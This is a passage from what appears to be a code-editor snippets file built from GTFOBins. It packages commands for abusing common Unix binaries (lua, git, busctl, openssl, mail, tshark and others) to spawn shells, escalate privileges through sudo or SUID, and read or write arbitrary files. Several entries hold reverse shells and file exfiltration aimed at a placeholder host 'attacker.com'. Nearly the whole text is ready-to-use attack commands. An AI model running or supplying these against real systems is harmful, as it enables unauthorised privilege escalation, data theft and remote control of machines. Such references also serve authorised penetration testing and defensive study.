        "description": "abuse dmidecode with sudo - \nIt can be used to overwrite files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode.\n\nGenerate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.\n\n\n\n- `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.\n\n\n\n- `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.\n\n\n\n```\n\nmake dmiwrite\n\nTF=$(mktemp)\n\necho \"DATA\" > $TF\n\n./dmiwrite $TF x.dmi\n\n```\n"
    },
    "mail shell (gtfobins)": {
        "prefix": "mail shell",
        "body": [
            "abuse mail with shell, This creates a valid Mbox file which may be required by the binary.",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo \"From nobody@localhost \\$(date)\" > \\$TF",
            "mail -f \\$TF",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse mail with shell - This creates a valid Mbox file which may be required by the binary."
    },
    "mail sudo (gtfobins)": {
        "prefix": "mail sudo",
        "body": [
            "abuse mail with sudo, GNU version only.",
            "",
            "```sh",
            "sudo mail --exec='!/bin/sh'${0}",
            "```"
        ],
        "description": "abuse mail with sudo - GNU version only."
    },
    "logsave shell (gtfobins)": {
        "prefix": "logsave shell",
        "body": [
            "abuse logsave with shell",
            "",
            "```sh",
            "logsave /dev/null /bin/sh -i${0}",
            "```"
        ],
        "description": "abuse logsave with shell"
    },
    "logsave sudo (gtfobins)": {
        "prefix": "logsave sudo",
        "body": [
            "abuse logsave with sudo",
            "",
            "```sh",
            "sudo logsave /dev/null /bin/sh -i${0}",
            "```"
        ],
        "description": "abuse logsave with sudo"
    },
    "logsave suid (gtfobins)": {
        "prefix": "logsave suid",
        "body": [
            "abuse logsave with suid",
            "",
            "```sh",
            "./logsave /dev/null /bin/sh -i -p${0}",
            "```"
        ],
        "description": "abuse logsave with suid"
    },
    "screen shell (gtfobins)": {
        "prefix": "screen shell",
        "body": [
            "abuse screen with shell",
            "",
            "```sh",
            "screen${0}",
            "```"
        ],
        "description": "abuse screen with shell"
    },
    "screen file-write (gtfobins)": {
        "prefix": "screen file-write",
        "body": [
            "abuse screen with file-write, This works on screen version 4.05.00. Data is appended to the file and `\\n` is converted to `\\r\\n`.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "screen -L \\$LFILE echo DATA${0}",
            "```"
        ],
        "description": "abuse screen with file-write - This works on screen version 4.05.00. Data is appended to the file and `\\n` is converted to `\\r\\n`."
    },
    "screen sudo (gtfobins)": {
        "prefix": "screen sudo",
        "body": [
            "abuse screen with sudo",
            "",
            "```sh",
            "sudo screen${0}",
            "```"
        ],
        "description": "abuse screen with sudo"
    },
    "yelp file-read (gtfobins)": {
        "prefix": "yelp file-read",
        "body": [
            "abuse yelp with file-read, This spawns a graphical window containing the file content somehow corrupted by word wrapping, it might not be suitable to read arbitrary files. The path must be absolute.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "yelp \"man:\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse yelp with file-read - This spawns a graphical window containing the file content somehow corrupted by word wrapping, it might not be suitable to read arbitrary files. The path must be absolute."
    },
    "bc file-read (gtfobins)": {
        "prefix": "bc file-read",
        "body": [
            "abuse bc with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "bc -s \\$LFILE",
            "quit${0}",
            "```"
        ],
        "description": "abuse bc with file-read"
    },
    "bc sudo (gtfobins)": {
        "prefix": "bc sudo",
        "body": [
            "abuse bc with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo bc -s \\$LFILE",
            "quit${0}",
            "```"
        ],
        "description": "abuse bc with sudo"
    },
    "bc suid (gtfobins)": {
        "prefix": "bc suid",
        "body": [
            "abuse bc with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./bc -s \\$LFILE",
            "quit${0}",
            "```"
        ],
        "description": "abuse bc with suid"
    },
    "lua shell (gtfobins)": {
        "prefix": "lua shell",
        "body": [
            "abuse lua with shell",
            "",
            "```sh",
            "lua -e 'os.execute(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse lua with shell"
    },
    "lua non-interactive-reverse-shell (gtfobins)": {
        "prefix": "lua non-interactive-reverse-shell",
        "body": [
            "abuse lua with non-interactive-reverse-shell, Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires `lua-socket` installed.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "lua -e 'local s=require(\"socket\");",
            "  local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  while true do",
            "    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));t:send(b);",
            "  end;",
            "  f:close();t:close();'${0}",
            "```"
        ],
        "description": "abuse lua with non-interactive-reverse-shell - Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires `lua-socket` installed."
    },
    "lua non-interactive-bind-shell (gtfobins)": {
        "prefix": "lua non-interactive-bind-shell",
        "body": [
            "abuse lua with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell. This requires `lua-socket` installed.",
            "",
            "```sh",
            "export LPORT=${1:12345}",
            "lua -e 'local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  while true do",
            "    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));c:send(b);",
            "  end;c:close();f:close();'${0}",
            "```"
        ],
        "description": "abuse lua with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell. This requires `lua-socket` installed."
    },
    "lua file-upload (gtfobins)": {
        "prefix": "lua file-upload",
        "body": [
            "abuse lua with file-upload, Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires `lua-socket` installed.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_send}",
            "lua -e '",
            "  local f=io.open(os.getenv(\"LFILE\"), 'rb')",
            "  local d=f:read(\"*a\")",
            "  io.close(f);",
            "  local s=require(\"socket\");",
            "  local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  t:send(d);",
            "  t:close();'${0}",
            "```"
        ],
        "description": "abuse lua with file-upload - Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires `lua-socket` installed."
    },
    "lua file-download (gtfobins)": {
        "prefix": "lua file-download",
        "body": [
            "abuse lua with file-download, Fetch a remote file via TCP. Run `nc target.com 12345\n< \"file_to_send\"` on the attacker box to send the file. This requires `lua-socket` installed.",
            "",
            "```sh",
            "export LPORT=${2:12345}",
            "export LFILE=${1:file_to_save}",
            "lua -e 'local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  local d,x=c:receive(\"*a\");",
            "  c:close();",
            "  local f=io.open(os.getenv(\"LFILE\"), \"wb\");",
            "  f:write(d);",
            "  io.close(f);'${0}",
            "```"
        ],
        "description": "abuse lua with file-download - Fetch a remote file via TCP. Run `nc target.com 12345\n< \"file_to_send\"` on the attacker box to send the file. This requires `lua-socket` installed."
    },
    "lua file-write (gtfobins)": {
        "prefix": "lua file-write",
        "body": [
            "abuse lua with file-write",
            "",
            "```sh",
            "lua -e 'local f=io.open(\"${1:file_to_write}\", \"wb\"); f:write(\"DATA\"); io.close(f);'${0}",
            "```"
        ],
        "description": "abuse lua with file-write"
    },
    "lua file-read (gtfobins)": {
        "prefix": "lua file-read",
        "body": [
            "abuse lua with file-read",
            "",
            "```sh",
            "lua -e 'local f=io.open(\"${1:file_to_read}\", \"rb\"); print(f:read(\"*a\")); io.close(f);'${0}",
            "```"
        ],
        "description": "abuse lua with file-read"
    },
    "lua suid (gtfobins)": {
        "prefix": "lua suid",
        "body": [
            "abuse lua with suid",
            "",
            "```sh",
            "lua -e 'local f=io.open(\"${1:file_to_read}\", \"rb\"); print(f:read(\"*a\")); io.close(f);'${0}",
            "```"
        ],
        "description": "abuse lua with suid"
    },
    "lua sudo (gtfobins)": {
        "prefix": "lua sudo",
        "body": [
            "abuse lua with sudo",
            "",
            "```sh",
            "sudo lua -e 'os.execute(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse lua with sudo"
    },
    "lua limited-suid (gtfobins)": {
        "prefix": "lua limited-suid",
        "body": [
            "abuse lua with limited-suid",
            "",
            "```sh",
            "./lua -e 'os.execute(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse lua with limited-suid"
    },
    "msgattrib file-read (gtfobins)": {
        "prefix": "msgattrib file-read",
        "body": [
            "abuse msgattrib with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "msgattrib -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msgattrib with file-read"
    },
    "msgattrib sudo (gtfobins)": {
        "prefix": "msgattrib sudo",
        "body": [
            "abuse msgattrib with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo msgattrib -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msgattrib with sudo"
    },
    "msgattrib suid (gtfobins)": {
        "prefix": "msgattrib suid",
        "body": [
            "abuse msgattrib with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./msgattrib -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msgattrib with suid"
    },
    "busctl shell (gtfobins)": {
        "prefix": "busctl shell",
        "body": [
            "abuse busctl with shell",
            "",
            "```sh",
            "busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'${0}",
            "```"
        ],
        "description": "abuse busctl with shell"
    },
    "busctl sudo (gtfobins)": {
        "prefix": "busctl sudo",
        "body": [
            "abuse busctl with sudo",
            "",
            "```sh",
            "sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'${0}",
            "```"
        ],
        "description": "abuse busctl with sudo"
    },
    "busctl suid (gtfobins)": {
        "prefix": "busctl suid",
        "body": [
            "abuse busctl with suid",
            "",
            "```sh",
            "./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'${0}",
            "```"
        ],
        "description": "abuse busctl with suid"
    },
    "csplit file-read (gtfobins)": {
        "prefix": "csplit file-read",
        "body": [
            "abuse csplit with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "csplit \\$LFILE 1",
            "cat xx01${0}",
            "```"
        ],
        "description": "abuse csplit with file-read"
    },
    "csplit file-write (gtfobins)": {
        "prefix": "csplit file-write",
        "body": [
            "abuse csplit with file-write, Writes the data to `xx0file_to_write`. If needed, a different prefix can be specified with `-f` (instead of `xx`).",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo \"DATA\" > \\$TF",
            "LFILE=${1:file_to_write}",
            "csplit -z -b \"%d\\$LFILE\" \\$TF 1${0}",
            "```"
        ],
        "description": "abuse csplit with file-write - Writes the data to `xx0file_to_write`. If needed, a different prefix can be specified with `-f` (instead of `xx`)."
    },
    "csplit suid (gtfobins)": {
        "prefix": "csplit suid",
        "body": [
            "abuse csplit with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "csplit \\$LFILE 1",
            "cat xx01${0}",
            "```"
        ],
        "description": "abuse csplit with suid"
    },
    "csplit sudo (gtfobins)": {
        "prefix": "csplit sudo",
        "body": [
            "abuse csplit with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "csplit \\$LFILE 1",
            "cat xx01${0}",
            "```"
        ],
        "description": "abuse csplit with sudo"
    },
    "tee file-write (gtfobins)": {
        "prefix": "tee file-write",
        "body": [
            "abuse tee with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo DATA | ./tee -a \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tee with file-write"
    },
    "tee suid (gtfobins)": {
        "prefix": "tee suid",
        "body": [
            "abuse tee with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo DATA | ./tee -a \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tee with suid"
    },
    "tee sudo (gtfobins)": {
        "prefix": "tee sudo",
        "body": [
            "abuse tee with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo DATA | sudo tee -a \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tee with sudo"
    },
    "iftop shell (gtfobins)": {
        "prefix": "iftop shell",
        "body": [
            "abuse iftop with shell",
            "",
            "```sh",
            "iftop",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse iftop with shell"
    },
    "iftop limited-suid (gtfobins)": {
        "prefix": "iftop limited-suid",
        "body": [
            "abuse iftop with limited-suid",
            "",
            "```sh",
            "./iftop",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse iftop with limited-suid"
    },
    "iftop sudo (gtfobins)": {
        "prefix": "iftop sudo",
        "body": [
            "abuse iftop with sudo",
            "",
            "```sh",
            "sudo iftop",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse iftop with sudo"
    },
    "wc file-read (gtfobins)": {
        "prefix": "wc file-read",
        "body": [
            "abuse wc with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "wc --files0-from \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse wc with file-read"
    },
    "wc suid (gtfobins)": {
        "prefix": "wc suid",
        "body": [
            "abuse wc with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./wc --files0-from \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse wc with suid"
    },
    "wc sudo (gtfobins)": {
        "prefix": "wc sudo",
        "body": [
            "abuse wc with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo wc --files0-from \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse wc with sudo"
    },
    "eb shell (gtfobins)": {
        "prefix": "eb shell",
        "body": [
            "abuse eb with shell",
            "",
            "```sh",
            "eb logs",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse eb with shell"
    },
    "eb sudo (gtfobins)": {
        "prefix": "eb sudo",
        "body": [
            "abuse eb with sudo",
            "",
            "```sh",
            "sudo eb logs",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse eb with sudo"
    },
    "elvish file-read (gtfobins)": {
        "prefix": "elvish file-read",
        "body": [
            "abuse elvish with file-read",
            "",
            "```sh",
            "export LFILE=${1:file_to_read}",
            "elvish -c 'echo (slurp <\\$E:LFILE)'${0}",
            "```"
        ],
        "description": "abuse elvish with file-read"
    },
    "elvish file-write (gtfobins)": {
        "prefix": "elvish file-write",
        "body": [
            "abuse elvish with file-write",
            "",
            "```sh",
            "export LFILE=${1:file_to_write}",
            "elvish -c 'echo DATA >\\$E:LFILE'${0}",
            "```"
        ],
        "description": "abuse elvish with file-write"
    },
    "elvish shell (gtfobins)": {
        "prefix": "elvish shell",
        "body": [
            "abuse elvish with shell",
            "",
            "```sh",
            "elvish${0}",
            "```"
        ],
        "description": "abuse elvish with shell"
    },
    "elvish suid (gtfobins)": {
        "prefix": "elvish suid",
        "body": [
            "abuse elvish with suid",
            "",
            "```sh",
            "./elvish${0}",
            "```"
        ],
        "description": "abuse elvish with suid"
    },
    "elvish sudo (gtfobins)": {
        "prefix": "elvish sudo",
        "body": [
            "abuse elvish with sudo",
            "",
            "```sh",
            "sudo elvish${0}",
            "```"
        ],
        "description": "abuse elvish with sudo"
    },
    "xdg-user-dir shell (gtfobins)": {
        "prefix": "xdg-user-dir shell",
        "body": [
            "abuse xdg-user-dir with shell",
            "",
            "```sh",
            "xdg-user-dir '}; /bin/sh #'${0}",
            "```"
        ],
        "description": "abuse xdg-user-dir with shell"
    },
    "xdg-user-dir sudo (gtfobins)": {
        "prefix": "xdg-user-dir sudo",
        "body": [
            "abuse xdg-user-dir with sudo",
            "",
            "```sh",
            "sudo xdg-user-dir '}; /bin/sh #'${0}",
            "```"
        ],
        "description": "abuse xdg-user-dir with sudo"
    },
    "troff file-read (gtfobins)": {
        "prefix": "troff file-read",
        "body": [
            "abuse troff with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "troff \\$LFILE${0}",
            "```"
        ],
        "description": "abuse troff with file-read"
    },
    "troff suid (gtfobins)": {
        "prefix": "troff suid",
        "body": [
            "abuse troff with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./troff \\$LFILE${0}",
            "```"
        ],
        "description": "abuse troff with suid"
    },
    "troff sudo (gtfobins)": {
        "prefix": "troff sudo",
        "body": [
            "abuse troff with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo troff \\$LFILE${0}",
            "```"
        ],
        "description": "abuse troff with sudo"
    },
    "setlock shell (gtfobins)": {
        "prefix": "setlock shell",
        "body": [
            "abuse setlock with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "setlock \\$TF /bin/sh${0}",
            "```"
        ],
        "description": "abuse setlock with shell"
    },
    "setlock suid (gtfobins)": {
        "prefix": "setlock suid",
        "body": [
            "abuse setlock with suid",
            "",
            "```sh",
            "./setlock - /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse setlock with suid"
    },
    "setlock sudo (gtfobins)": {
        "prefix": "setlock sudo",
        "body": [
            "abuse setlock with sudo",
            "",
            "```sh",
            "sudo setlock - /bin/sh${0}",
            "```"
        ],
        "description": "abuse setlock with sudo"
    },
    "git shell (gtfobins)": {
        "prefix": "git shell",
        "body": [
            "abuse git with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "ln -s /bin/sh \"\\$TF/git-x\"",
            "git \"--exec-path=\\$TF\" x${0}",
            "```"
        ],
        "description": "abuse git with shell"
    },
    "git file-read (gtfobins)": {
        "prefix": "git file-read",
        "body": [
            "abuse git with file-read, The read file content is displayed in `diff` style output format.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "git diff /dev/null \\$LFILE${0}",
            "```"
        ],
        "description": "abuse git with file-read - The read file content is displayed in `diff` style output format."
    },
    "git file-write (gtfobins)": {
        "prefix": "git file-write",
        "body": [
            "abuse git with file-write, The patch can be created locally by creating the file that will be written on the target using its absolute path, then `git diff /dev/null /path/to/file >x.patch`.",
            "",
            "```sh",
            "git apply --unsafe-paths --directory / x.patch${0}",
            "```"
        ],
        "description": "abuse git with file-write - The patch can be created locally by creating the file that will be written on the target using its absolute path, then `git diff /dev/null /path/to/file >x.patch`."
    },
    "git sudo (gtfobins)": {
        "prefix": "git sudo",
        "body": [
            "abuse git with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "ln -s /bin/sh \"\\$TF/git-x\"",
            "sudo git \"--exec-path=\\$TF\" x${0}",
            "```"
        ],
        "description": "abuse git with sudo"
    },
    "git limited-suid (gtfobins)": {
        "prefix": "git limited-suid",
        "body": [
            "abuse git with limited-suid",
            "",
            "```sh",
            "PAGER='sh -c \"exec sh 0<&1\"' ./git -p help${0}",
            "```"
        ],
        "description": "abuse git with limited-suid"
    },
    "fmt file-read (gtfobins)": {
        "prefix": "fmt file-read",
        "body": [
            "abuse fmt with file-read, This corrupts the output by wrapping very long lines at the given width.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "fmt -999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse fmt with file-read - This corrupts the output by wrapping very long lines at the given width."
    },
    "fmt suid (gtfobins)": {
        "prefix": "fmt suid",
        "body": [
            "abuse fmt with suid, This corrupts the output by wrapping very long lines at the given width.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./fmt -999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse fmt with suid - This corrupts the output by wrapping very long lines at the given width."
    },
    "fmt sudo (gtfobins)": {
        "prefix": "fmt sudo",
        "body": [
            "abuse fmt with sudo, This corrupts the output by wrapping very long lines at the given width.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo fmt -999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse fmt with sudo - This corrupts the output by wrapping very long lines at the given width."
    },
    "clamscan file-read (gtfobins)": {
        "prefix": "clamscan file-read",
        "body": [
            "abuse clamscan with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "TF=\\$(mktemp -d)",
            "touch \\$TF/empty.yara",
            "clamscan --no-summary -d \\$TF -f \\$LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory\\$/\\1/p'${0}",
            "```"
        ],
        "description": "abuse clamscan with file-read"
    },
    "clamscan suid (gtfobins)": {
        "prefix": "clamscan suid",
        "body": [
            "abuse clamscan with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "TF=\\$(mktemp -d)",
            "touch \\$TF/empty.yara",
            "./clamscan --no-summary -d \\$TF -f \\$LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory\\$/\\1/p'${0}",
            "```"
        ],
        "description": "abuse clamscan with suid"
    },
    "clamscan sudo (gtfobins)": {
        "prefix": "clamscan sudo",
        "body": [
            "abuse clamscan with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "TF=\\$(mktemp -d)",
            "touch \\$TF/empty.yara",
            "sudo clamscan --no-summary -d \\$TF -f \\$LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory\\$/\\1/p'${0}",
            "```"
        ],
        "description": "abuse clamscan with sudo"
    },
    "loginctl shell (gtfobins)": {
        "prefix": "loginctl shell",
        "body": [
            "abuse loginctl with shell",
            "",
            "```sh",
            "loginctl user-status",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse loginctl with shell"
    },
    "loginctl sudo (gtfobins)": {
        "prefix": "loginctl sudo",
        "body": [
            "abuse loginctl with sudo",
            "",
            "```sh",
            "sudo loginctl user-status",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse loginctl with sudo"
    },
    "tail file-read (gtfobins)": {
        "prefix": "tail file-read",
        "body": [
            "abuse tail with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "tail -c1G \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tail with file-read"
    },
    "tail suid (gtfobins)": {
        "prefix": "tail suid",
        "body": [
            "abuse tail with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./tail -c1G \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tail with suid"
    },
    "tail sudo (gtfobins)": {
        "prefix": "tail sudo",
        "body": [
            "abuse tail with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo tail -c1G \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tail with sudo"
    },
    "rpmverify shell (gtfobins)": {
        "prefix": "rpmverify shell",
        "body": [
            "abuse rpmverify with shell",
            "",
            "```sh",
            "rpmverify --eval '%(/bin/sh 1>&2)'${0}",
            "```"
        ],
        "description": "abuse rpmverify with shell"
    },
    "rpmverify limited-suid (gtfobins)": {
        "prefix": "rpmverify limited-suid",
        "body": [
            "abuse rpmverify with limited-suid",
            "",
            "```sh",
            "./rpmverify --eval '%(/bin/sh 1>&2)'${0}",
            "```"
        ],
        "description": "abuse rpmverify with limited-suid"
    },
    "rpmverify sudo (gtfobins)": {
        "prefix": "rpmverify sudo",
        "body": [
            "abuse rpmverify with sudo",
            "",
            "```sh",
            "sudo rpmverify --eval '%(/bin/sh 1>&2)'${0}",
            "```"
        ],
        "description": "abuse rpmverify with sudo"
    },
    "tshark shell (gtfobins)": {
        "prefix": "tshark shell",
        "body": [
            "abuse tshark with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'os.execute(\"/bin/sh\")' >\\$TF",
            "tshark -Xlua_script:\\$TF${0}",
            "```"
        ],
        "description": "abuse tshark with shell"
    },
    "msgfilter shell (gtfobins)": {
        "prefix": "msgfilter shell",
        "body": [
            "abuse msgfilter with shell, Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.",
            "",
            "```sh",
            "echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill \\$PPID'${0}",
            "```"
        ],
        "description": "abuse msgfilter with shell - Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once."
    },
    "msgfilter file-read (gtfobins)": {
        "prefix": "msgfilter file-read",
        "body": [
            "abuse msgfilter with file-read, The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data. `/bin/cat` can be replaced with any other *filter* program.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "msgfilter -P -i \"LFILE\" /bin/cat${0}",
            "```"
        ],
        "description": "abuse msgfilter with file-read - The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data. `/bin/cat` can be replaced with any other *filter* program."
    },
    "msgfilter sudo (gtfobins)": {
        "prefix": "msgfilter sudo",
        "body": [
            "abuse msgfilter with sudo, Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.",
            "",
            "```sh",
            "echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill \\$PPID'${0}",
            "```"
        ],
        "description": "abuse msgfilter with sudo - Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once."
    },
    "msgfilter suid (gtfobins)": {
        "prefix": "msgfilter suid",
        "body": [
            "abuse msgfilter with suid, Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.",
            "",
            "```sh",
            "echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill \\$PPID'${0}",
            "```"
        ],
        "description": "abuse msgfilter with suid - Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once."
    },
    "expect file-read (gtfobins)": {
        "prefix": "expect file-read",
        "body": [
            "abuse expect with file-read, The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message. Thus, this might not be suitable to read arbitrary binary files.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "expect \\$LFILE${0}",
            "```"
        ],
        "description": "abuse expect with file-read - The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message. Thus, this might not be suitable to read arbitrary binary files."
    },
    "expect shell (gtfobins)": {
        "prefix": "expect shell",
        "body": [
            "abuse expect with shell",
            "",
            "```sh",
            "expect -c 'spawn /bin/sh;interact'${0}",
            "```"
        ],
        "description": "abuse expect with shell"
    },
    "expect suid (gtfobins)": {
        "prefix": "expect suid",
        "body": [
            "abuse expect with suid",
            "",
            "```sh",
            "./expect -c 'spawn /bin/sh -p;interact'${0}",
            "```"
        ],
        "description": "abuse expect with suid"
    },
    "expect sudo (gtfobins)": {
        "prefix": "expect sudo",
        "body": [
            "abuse expect with sudo",
            "",
            "```sh",
            "sudo expect -c 'spawn /bin/sh;interact'${0}",
            "```"
        ],
        "description": "abuse expect with sudo"
    },
    "openssl reverse-shell (gtfobins)": {
        "prefix": "openssl reverse-shell",
        "body": [
            "abuse openssl with reverse-shell, \nTo receive the shell run the following on the attacker box:\n\n\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n\n\nCommunication between attacker and target will be encrypted.\n",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect \\$RHOST:\\$RPORT > /tmp/s; rm /tmp/s${0}",
            "```"
        ],
        "description": "abuse openssl with reverse-shell - \nTo receive the shell run the following on the attacker box:\n\n\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n\n\nCommunication between attacker and target will be encrypted.\n"
    },
    "openssl file-upload (gtfobins)": {
        "prefix": "openssl file-upload",
        "body": [
            "abuse openssl with file-upload, \nTo collect the file run the following on the attacker box:\n\n\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save\n\n\n\nSend a local file via TCP. Transmission will be encrypted.\n",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_send}",
            "openssl s_client -quiet -connect \\$RHOST:\\$RPORT < \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse openssl with file-upload - \nTo collect the file run the following on the attacker box:\n\n\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save\n\n\n\nSend a local file via TCP. Transmission will be encrypted.\n"
    },
    "openssl file-download (gtfobins)": {
        "prefix": "openssl file-download",
        "body": [
            "abuse openssl with file-download, \nTo send the file run the following on the attacker box:\n\n\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send\n\n\n\nFetch a file from a TCP port, transmission will be encrypted.\n",
            "",
            "```sh",
